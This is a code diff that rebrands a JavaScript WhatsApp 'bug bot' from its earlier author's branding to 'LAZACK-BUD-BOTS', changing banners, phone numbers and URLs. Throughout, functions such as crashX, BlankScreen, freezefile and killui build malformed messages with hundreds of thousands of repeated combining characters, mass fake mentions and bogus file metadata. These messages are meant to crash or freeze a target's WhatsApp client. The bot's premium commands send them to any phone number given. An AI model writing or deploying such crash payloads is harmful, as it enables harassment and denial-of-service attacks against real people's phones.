@@ -67,7 +67,7 @@ quoted: m
 }
 //FUNCTION ABAL ABAL  by AndraZyy 🗿
     async function LocSystem(target) {
-            let virtex = "⿻ 🔐 𝐒𝐯 𝐀𝐧𝐝𝐫𝐚𝐳𝐲𝐲 𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫 ⿻";
+            let virtex = "⿻ 🔐 LAZACK-BUD-BOTS ⿻";
             let memekz = Date.now();
 
             await AndraZyy.relayMessage(target, {
@@ -97,13 +97,13 @@ quoted: m
   async function f10(target, Ptcp = false) {
     await AndraZyy.relayMessage(target, {
       extendedTextMessage: {
-        text: "`🔐 𝐒𝐯 𝐀𝐧𝐝𝐫𝐚𝐳𝐲𝐲 𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫`\n>  ͆ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺\n" + "ી".repeat(55000),
+        text: "`🔐 LAZACK-BUD-BOTS`\n>  ͆ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺\n" + "ી".repeat(55000),
         contextInfo: {
-          mentionedJid: ["62895329013688@s.whatsapp.net", ...Array.from({
+          mentionedJid: ["255734980103@s.whatsapp.net", ...Array.from({
             length: 15000
           }, () => "1" + Math.floor(Math.random() * 60000) + "@s.whatsapp.net")],
           stanzaId: "1234567890ABCDEF",
-          participant: "62895329013688@s.whatsapp.net",
+          participant: "255734980103@s.whatsapp.net",
           quotedMessage: {
             callLogMesssage: {
               isVideo: false,
@@ -111,7 +111,7 @@ quoted: m
               durationSecs: "999",
               callType: "REGULAR",
               participants: [{
-                jid: "62895329013688@s.whatsapp.net",
+                jid: "255734980103@s.whatsapp.net",
                 callOutcome: "5"
               }]
             }
@@ -125,7 +125,7 @@ quoted: m
           quotedAd: {
             advertiserName: " X ",
             mediaType: "IMAGE",
-            jpegThumbnail: fs.readFileSync("./Andrazyy.jpg"),
+            jpegThumbnail: fs.readFileSync("./assets/background.png"),
             caption: " X "
           },
           placeholderKey: {
@@ -138,7 +138,7 @@ quoted: m
           ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
           externalAdReply: {
             title: "‎᭎ᬼᬼᬼৗীি𑍅𑍑\n⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿\n𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿",
-            body: "🔐 𝐒𝐯 𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲 𝐒𝐞𝐧𝐝 𝐁𝐮𝐠",
+            body: "🔐 LAZACK-BUGS HAAA",
             mediaType: "VIDEO",
             renderLargerThumbnail: true,
             previewType: "VIDEO",
@@ -190,7 +190,7 @@ quoted: m
         jid: target
       }
     } : {});
-console.log(chalk.red.bold('🔐 𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫 𝐒𝐞𝐧𝐝 𝐁𝐮𝐠'))
+console.log(chalk.red.bold('🔐 lazack bugs bot'))
 };
 async function XeonXRobust(target, Ptcp = true) {
   const jids = `_*~@0~*_\n`.repeat(10200);
@@ -207,7 +207,7 @@ async function XeonXRobust(target, Ptcp = true) {
               fileLength: "9999999999999",
               pageCount: 1316134911,
               mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
-              fileName: "🔐 𝐒𝐯 𝐀𝐧𝐝𝐫𝐚𝐳𝐲𝐲 𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫",
+              fileName: "🔐 LAZACK-BUD-BOTS",
               fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
               directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
               mediaKeyTimestamp: "1726867151",
@@ -217,7 +217,7 @@ async function XeonXRobust(target, Ptcp = true) {
             hasMediaAttachment: true
           },
           body: {
-            text: "🔐 𝐒𝐯 𝐀𝐧𝐝𝐫𝐚𝐳𝐲𝐲 𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫" + ui + jids
+            text: "🔐 LAZACK-BUD-BOTS" + ui + jids
           },
           contextInfo: {
             mentionedJid: ["0@s.whatsapp.net"],
@@ -244,7 +244,7 @@ async function XeonXRobust(target, Ptcp = true) {
                 fileLength: "9999999999999",
                 pageCount: 1316134911,
                 mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
-                fileName: "🔐 𝐒𝐯 𝐀𝐧𝐝𝐫𝐚𝐳𝐲𝐲 𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫",
+                fileName: "🔐 LAZACK-BUD-BOTS",
                 fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                 directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                 mediaKeyTimestamp: "1724474503",
@@ -406,7 +406,7 @@ async function XeonXRobust(target, Ptcp = true) {
     AndraZyy.relayMessage(target, messagePayload, { participant: { jid: target } }, { messageId: null });
 }
  async function BlankScreen(target, Ptcp = false) {
-let virtex = "🔐 𝐒𝐯 𝐀𝐧𝐝𝐫𝐚𝐳𝐲𝐲 𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫" + "ྫྷ".repeat(77777) + "@0".repeat(50000);
+let virtex = "🔐 LAZACK-BUD-BOTS" + "ྫྷ".repeat(77777) + "@0".repeat(50000);
 			await AndraZyy.relayMessage(target, {
 					ephemeralMessage: {
 						message: {
@@ -472,10 +472,10 @@ let virtex = "🔐 𝐒𝐯 𝐀𝐧𝐝𝐫𝐚𝐳𝐲𝐲 𝐀𝐠𝐥𝐞�
 					}
 				} : {}
 			);
-            console.log(chalk.red.bold('🔐 𝐒𝐯 𝐀𝐧𝐝𝐫𝐚𝐳𝐲𝐲 𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫'))
+            console.log(chalk.red.bold('🔐 LAZACK-BUD-BOTS'))
    	};
 async function freezefile(target, QBug, Ptcp = true) {
-    let virtex = "🔐 𝐒𝐯 𝐀𝐧𝐝𝐫𝐚𝐳𝐲𝐲 𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫" + "ြ".repeat(25000);
+    let virtex = "🔐 LAZACK-BUD-BOTS" + "ြ".repeat(25000);
     await AndraZyy.relayMessage(target, {
         groupMentionedMessage: {
             message: {
@@ -539,7 +539,7 @@ async function thunderblast_notif(target) {
 									messageParamsJson: "{}",
 								},
 								contextInfo: {
-									mentionedJid: ["628888888888@s.whatsapp.net", ...Array.from({
+									mentionedJid: ["255734980103@s.whatsapp.net", ...Array.from({
 										length: 10000
 									}, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")],
 									forwardingScore: 1,
@@ -591,7 +591,7 @@ async function thunderblast_notif(target) {
                         hasMediaAttachment: true
                     },
                     body: {
-                        text: "🔐 𝐒𝐯 𝐀𝐧𝐝𝐫𝐚𝐳𝐲𝐲 𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫" + "ꦾ".repeat(300000)
+                        text: "🔐 LAZACK-BUD-BOTS" + "ꦾ".repeat(300000)
                     },
                     nativeFlowMessage: {},
                     contextInfo: {
@@ -608,7 +608,7 @@ async function IosMJ(target, Ptcp = false) {
         target,
         {
           extendedTextMessage: {
-            text: "🔐 𝐒𝐯 𝐀𝐧𝐝𝐫𝐚𝐳𝐲𝐲 𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫" + "".repeat(90000),
+            text: "🔐 LAZACK-BUD-BOTS" + "".repeat(90000),
             contextInfo: {
               stanzaId: "1234567890ABCDEF",
               participant: "0@s.whatsapp.net",
@@ -658,8 +658,8 @@ async function IosMJ(target, Ptcp = false) {
                   "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
                 sourceType: " x ",
                 sourceId: " x ",
-                sourceUrl: "https://AndraZyy_Agler_Forger",
-                mediaUrl: "https://AndraZyy_Agler_Forger",
+                sourceUrl: "https://home.lazackorganisation.my.id",
+                mediaUrl: "https://home.lazackorganisation.my.id",
                 containsAutoReply: true,
                 renderLargerThumbnail: true,
                 showAdAttribution: true,
@@ -671,7 +671,7 @@ async function IosMJ(target, Ptcp = false) {
               entryPointConversionDelaySeconds: 5,
               disappearingMode: {},
               actionLink: {
-                url: "https://AndraZyy_Agler_Forger",
+                url: "https://home.lazackorganisation.my.id",
               },
               groupSubject: "Example Group Subject",
               parentGroupJid: "6287888888888-1234567890@g.us",
@@ -719,7 +719,7 @@ async function crashX(target, kuwoted) {
  "fileLength": "999999999",
  "pageCount": 999999999,
  "mediaKey": "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
- "fileName": `🔐 𝐒𝐯 𝐀𝐧𝐝𝐫𝐚𝐳𝐲𝐲 𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫.xp`+"ྦྷ".repeat(60000),
+ "fileName": `🔐 LAZACK-BUD-BOTS.xp`+"ྦྷ".repeat(60000),
  "fileEncSha256": "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
  "directPath": "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
  "mediaKeyTimestamp": "1715880173"
@@ -729,7 +729,7 @@ await AndraZyy.relayMessage(target, etc.message, { participant: { jid: target },
 }
 
 async function crashbeta(target, ptcp = false) {
-let BetaFc = "🔐 𝐒𝐯 𝐀𝐧𝐝𝐫𝐚𝐳𝐲𝐲 𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫" + "ꦾ".repeat(250000);
+let BetaFc = "🔐 LAZACK-BUD-BOTS" + "ꦾ".repeat(250000);
 
 const messageContent = {
     ephemeralMessage: {
@@ -751,8 +751,8 @@ const messageContent = {
                         mentionedJid: [m.chat],
                         groupMentions: [
                             { 
-                                groupJid: "@120363321780343299@g.us", 
-                                groupSubject: "AndraZyy nih deck" 
+                                groupJid: "@@g.us", 
+                                groupSubject: "lazack groups" 
                             }
                         ]
                     }
@@ -764,7 +764,7 @@ const messageContent = {
 }
 
 async function Bug2(target, ptcp = false) {
-    let akumw = "🔐 𝐒𝐯 𝐀𝐧𝐝𝐫𝐚𝐳𝐲𝐲 𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫" + "ꦿꦾ꧀".repeat(50000);
+    let akumw = "🔐 LAZACK-BUD-BOTS" + "ꦿꦾ꧀".repeat(50000);
     await AndraZyy.relayMessage(target, {
         groupMentionedMessage: {
             message: {
@@ -801,7 +801,7 @@ async function Bug2(target, ptcp = false) {
 }
 
 async function DocBug(target) {
- let virtex = "🔐 𝐒𝐯 𝐀𝐧𝐝𝐫𝐚𝐳𝐲𝐲 𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫";
+ let virtex = "🔐 LAZACK-BUD-BOTS";
    AndraZyy.relayMessage(target, {
      groupMentionedMessage: {
        message: {
@@ -823,7 +823,7 @@ async function DocBug(target) {
                                 hasMediaAttachment: true
                             },
                             body: {
-                                text: "🔐 𝐒𝐯 𝐀𝐧𝐝𝐫𝐚𝐳𝐲𝐲 𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫" + "ꦾ".repeat(100000) + "@1".repeat(300000)
+                                text: "🔐 LAZACK-BUD-BOTS" + "ꦾ".repeat(100000) + "@1".repeat(300000)
                             },
                             nativeFlowMessage: {},
                             contextInfo: {
@@ -848,12 +848,12 @@ async function LocaBugs(target) {
                         hasMediaAttachment: true
                     },
                     body: {
-                        text: `🔐 𝐒𝐯 𝐀𝐧𝐝𝐫𝐚𝐳𝐲𝐲 𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫`+'ꦾ'.repeat(100000)
+                        text: `🔐 LAZACK-BUD-BOTS`+'ꦾ'.repeat(100000)
                     },
                     nativeFlowMessage: {},
                     contextInfo: {
                         mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
-                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "🔐 𝐒𝐯 𝐀𝐧𝐝𝐫𝐚𝐳𝐲𝐲 𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫" }]
+                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "🔐 LAZACK-BUD-BOTS" }]
                     }
                 }
             }
@@ -888,7 +888,7 @@ async function killui(target, Ptcp = true) {
                   hasMediaAttachment: true,
                 },
                 body: {
-                  text: "⿻🔐 𝐒𝐯 𝐀𝐧𝐝𝐫𝐚𝐳𝐲𝐲 𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫\n" + "ꦾ".repeat(28000),
+                  text: "⿻🔐 LAZACK-BUD-BOTS\n" + "ꦾ".repeat(28000),
                 },
                 nativeFlowMessage: {
                   messageParamsJson: "{}",
@@ -948,7 +948,7 @@ message: {
   "liveLocationMessage": {
     "degreesLatitude": "p",
     "degreesLongitude": "p",
-    "caption": `🔐 𝐒𝐯 𝐀𝐧𝐝𝐫𝐚𝐳𝐲𝐲 𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫`+"ꦾ".repeat(50000),
+    "caption": `🔐 LAZACK-BUD-BOTS`+"ꦾ".repeat(50000),
     "sequenceNumber": "0",
     "jpegThumbnail": ""
      }
@@ -971,7 +971,7 @@ async function func1(target) {
                         hasMediaAttachment: true
                     },
                     body: {
-                        text: "🔐 𝐒𝐯 𝐀𝐧𝐝𝐫𝐚𝐳𝐲𝐲 𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫" + "ꦹꦹꦹ".repeat(400000)
+                        text: "🔐 LAZACK-BUD-BOTS" + "ꦹꦹꦹ".repeat(400000)
                     },
                     nativeFlowMessage: {},
                     contextInfo: {
@@ -1070,7 +1070,7 @@ async function newsLetter(target) {
                         message: {
                             newsletterAdminInviteMessage: {
                                 newsletterJid: `33333333333333333@newsletter`,
-                                newsletterName: "NassCrashV1" + "ી".repeat(120000),
+                                newsletterName: "lazackbots" + "ી".repeat(120000),
                                 jpegThumbnail: "",
                                 caption: "ꦽ".repeat(120000),
                                 inviteExpiration: Date.now() + 1814400000,
@@ -1130,7 +1130,7 @@ async function newsLetter(target) {
             degreesLatitude: 999.03499999999999,
             degreesLongitude: -999.03499999999999,
             name: CrashQAiphone,
-            url: "https://t.me/AndraZyy_Agler_Forger",
+            url: "https://t.me/home.lazackorganisation.my.id",
           },
         },
         {
@@ -1185,7 +1185,7 @@ async function newsLetter(target) {
               stanzaId: target,
               participant: target,
               quotedMessage: {
-                conversation: "🔐 𝐒𝐯 𝐀𝐧𝐝𝐫𝐚𝐳𝐲𝐲 𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫" + "ꦾ࣯࣯".repeat(50000),
+                conversation: "🔐 LAZACK-BUD-BOTS" + "ꦾ࣯࣯".repeat(50000),
               },
               disappearingMode: {
                 initiator: "CHANGED_IN_CHAT",
@@ -1218,13 +1218,13 @@ async function newsLetter(target) {
         target,
         {
           extendedTextMessage: {
-            text: `🔐 𝐒𝐯 𝐀𝐧𝐝𝐫𝐚𝐳𝐲𝐲 𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫` + "࣯ꦾ".repeat(90000),
+            text: `🔐 LAZACK-BUD-BOTS` + "࣯ꦾ".repeat(90000),
             contextInfo: {
               fromMe: false,
               stanzaId: target,
               participant: target,
               quotedMessage: {
-                conversation: "🔐 𝐒𝐯 𝐀𝐧𝐝𝐫𝐚𝐳𝐲𝐲 𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫" + "ꦾ".repeat(90000),
+                conversation: "🔐 LAZACK-BUD-BOTS" + "ꦾ".repeat(90000),
               },
               disappearingMode: {
                 initiator: "CHANGED_IN_CHAT",
@@ -1260,9 +1260,9 @@ item1.TEL;waid=${i}:${i}\n
 item1.X-ABLabel:Ponsel\n
 item2.EMAIL;type=INTERNET:deltaonexi@gmail.com\n
 item2.X-ABLabel:Email\n
-item3.URL:https://github.com/yoshi-xhurayra\n
+item3.URL:https://github.com/lazack28\n
 item3.X-ABLabel:GitHub\n
-item4.ADR:;;Indonesia;;;;\n
+item4.ADR:;;tanzania;;;;\n
 item4.X-ABLabel:Region\n
 END:VCARD`
 })
@@ -1321,12 +1321,12 @@ const reply = (teks) => {
 AndraZyy.sendMessage(from, { text: teks, contextInfo: { 
 "externalAdReply": { 
 "showAdAttribution": true, 
-"title": "⚡ 𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫", 
+"title": "⚡ lazack developers", 
 "containsAutoReply": true, 
 "mediaType": 1, 
 "thumbnail": fkethmb, 
-"mediaUrl": "https://whatsapp.com/channel/0029Vb5urVGEquiUZ27h4j2F", 
-"sourceUrl": "https://whatsapp.com/channel/0029Vb5urVGEquiUZ27h4j2F" }}}, { quoted: m }) }
+"mediaUrl": "https://whatsapp.com/channel/", 
+"sourceUrl": "https://whatsapp.com/channel/" }}}, { quoted: m }) }
 
 const reply2 = (teks) => {
 AndraZyy.sendMessage(from, { text : teks }, { quoted : m })
@@ -1399,10 +1399,10 @@ var waktuucapan = 'Selamat Tengah Malam'
 }
 
 switch(command) {
-case "agler-v1": case "agler-v2": case "agler-v3": 
-if (!isPremium) return reply(" khusus premium ")
+case "lazack-v1": case "lazack-v2": case "lazack-v3": 
+if (!isPremium) return reply(" premium users only ")
 if (!q) {
-return reply(`\`Example:\` : ${prefix+command} 628×××`);
+return reply(`\`Example:\` : ${prefix+command} 255734xxx`);
 }
 target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
 reply(`bug ${prefix+command} successfully sent to the destination number. *minimum 5 minute pause*`);
@@ -1424,9 +1424,9 @@ await LocSystem(target);
 }
 break;
 case "all-device": case "ui-system":
-if (!isPremium) return reply(" khusus premium ")
+if (!isPremium) return reply(" premium users only ")
 if (!q) {
-return reply(`\`Example:\` : ${prefix+command} 628×××`);
+return reply(`\`Example:\` : ${prefix+command} 255734xxx`);
 }
 target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
 reply(`bug ${prefix+command} successfully sent to the destination number. *minimum 5 minute pause*`); 
@@ -1449,9 +1449,9 @@ await freezefile(target, { ptcp: true });
 }
 break;
 case "beta-fc": case "crash-fc": case "xvip-bug":
-if (!isPremium) return reply(" khusus premium ")
+if (!isPremium) return reply(" premium users only ")
 if (!q) {
-return reply(`\`Example:\` : ${prefix+command} 628×××`);
+return reply(`\`Example:\` : ${prefix+command} 255734xxx`);
 }
 target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
 reply(`bug ${prefix+command} successfully sent to the destination number. *minimum 5 minute pause*`); 
@@ -1489,31 +1489,31 @@ await XiosVirus(target);
 }
 break;
 case 'love-you': {
-if (!isPremium) return m.reply(" Khusus Premium ")
-if (!q) return m.reply(`Example:\n ${prefix + command} 62xxxx`)
+if (!isPremium) return m.reply(" premium users only ")
+if (!q) return m.reply(`Example:\n ${prefix + command} 255734xxx`)
 BapakLuWkwk = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
-AndraZyy.sendMessage(BapakLuWkwk, {text: `💞 𝐤𝐚𝐤 𝐚𝐤𝐮 𝐜𝐢𝐧𝐭𝐚 𝐤𝐚𝐦𝐮 😖 👉🏻👈🏻 @𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲 \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n`})
-m.reply("done clear chat by AndraZyy😖")
-AndraZyy.sendMessage(m.chat, {audio: fs.readFileSync('./X Andrazyy v15/Andrazyy15 dingin.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
+AndraZyy.sendMessage(BapakLuWkwk, {text: `💞 I LOVE YOU BOY FROM YOURE LOVE MIRCUS \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n`})
+m.reply("done clear chat by lazack😖")
+AndraZyy.sendMessage(m.chat, {audio: fs.readFileSync('./assets/mtaju.mp3'), mimetype:'audio/mpeg', ptt: true}, {quoted: m})
 }
 break;
 
 case "menu": case "start": case "andrazyy": case "xmenu": case "bugmenu": {
-if (!isPremium) return reply(" khusus premium ")
+if (!isPremium) return reply(" premium users only ")
 officialist = `${nomerOwner}@s.whatsapp.net`
 whatsappmessage = `
-*\`[ 𝗔𝗚𝗟𝗘𝗥 𝗙𝗢𝗥𝗚𝗘𝗥 ]\`*
+*\`[ LAZACK BUGS ]\`*
 ❏ 𝘂𝘀𝗲𝗿 𝗻𝗮𝗺𝗲 : *${pushname}*
-❏ 𝗯𝗼𝘁 𝗻𝗮𝗺𝗲 : 𝗮𝗴𝗹𝗲𝗿 𝗳𝗼𝗿𝗴𝗲𝗿
+❏ 𝗯𝗼𝘁 𝗻𝗮𝗺𝗲 : LAZACK ADVANCED
 ❏ 𝘃𝗲𝗿𝘀𝗶𝗼𝗻 : 15.5.0
-❏ 𝗱𝗲𝘃 : t.me/Andrazyy_Offc
+❏ 𝗱𝗲𝘃 : TEAM LAZACK 28
 ❏ 𝗺𝗼𝗱𝗲 𝗯𝗼𝘁 : *${AndraZyy.public ? "public": "self"}*
 
 *\`✰ 𝗕𝘂𝗴 ↯ 𝗠𝗲𝗻𝘂 ✰\`*
 ↯ /love-you 𝗻𝘂𝗺𝗯𝗲𝗿
-↯ /agler-v1 𝗻𝘂𝗺𝗯𝗲𝗿
-↯ /agler-v2 𝗻𝘂𝗺𝗯𝗲𝗿
-↯ /agler-v3 𝗻𝘂𝗺𝗯𝗲𝗿
+↯ /lazack-v1 𝗻𝘂𝗺𝗯𝗲𝗿
+↯ /lazack-v2 𝗻𝘂𝗺𝗯𝗲𝗿
+↯ /lazack-v3 𝗻𝘂𝗺𝗯𝗲𝗿
 ↯ /all-device 𝗻𝘂𝗺𝗯𝗲𝗿
 ↯ /ui-system 𝗻𝘂𝗺𝗯𝗲𝗿
 ↯ /Xvip-fc 
@@ -1524,31 +1524,29 @@ whatsappmessage = `
